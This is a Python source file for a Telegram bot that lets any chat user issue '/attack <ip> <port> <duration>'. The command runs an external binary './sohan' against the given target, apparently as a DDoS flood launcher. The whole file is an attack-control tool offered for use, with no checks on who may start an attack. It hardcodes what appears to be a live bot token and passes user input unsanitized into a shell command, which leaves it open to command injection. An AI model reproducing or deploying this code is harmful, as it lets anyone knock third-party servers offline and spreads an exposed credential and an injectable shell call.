import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7691714265:AAF6ar30qBYl-NGPmxFzH2z0I7cnMvye2Mc'  # Replace with your actual token
attack_in_progress = False

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_username = update.effective_user.username  # Get the username

    message = (
        f"*🔰 Welcome {user_username} 🔰*\n\n"
        "*⚠️ Use: /attack <ip> <port> <duration>*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./sohan {ip} {port} {duration} 20",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    args = context.args

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Another attack is already in progress. Please wait.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Use: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*🚀 Attack Launched!*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*"
        
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()